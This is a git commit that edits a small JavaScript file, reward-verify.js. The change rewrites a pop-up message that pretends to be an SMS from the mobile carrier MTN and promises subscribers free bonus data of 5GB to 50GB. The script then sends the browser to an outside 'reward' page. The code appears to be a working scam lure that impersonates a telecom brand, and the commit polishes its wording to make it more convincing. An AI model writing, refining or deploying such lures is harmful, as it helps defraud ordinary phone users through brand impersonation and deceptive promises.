3791bd86d9036366730a5aeaac94305599fcf6b6
itidetidre-glitch <itidetidre@gmail.com>
2026-05-21 01:32:50 -0700

    Update reward-verify.js

--- reward-verify.js
+++ reward-verify.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE NOW'
-password=prompt('SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers, press OK To Check Now ','ACTIVATE NOW');
+password=prompt('SMS: Dear Customer, STOP ignoring your. old MTN SIM. You may qualify for FREE bonus data from 5GB to 50GB depending on your SIM age, press OK To Check Now ','ACTIVATE NOW');
 if (password != 'ACTIVATE NOW') {
 location.href='https://mmaifot.com/reward.html';
 }
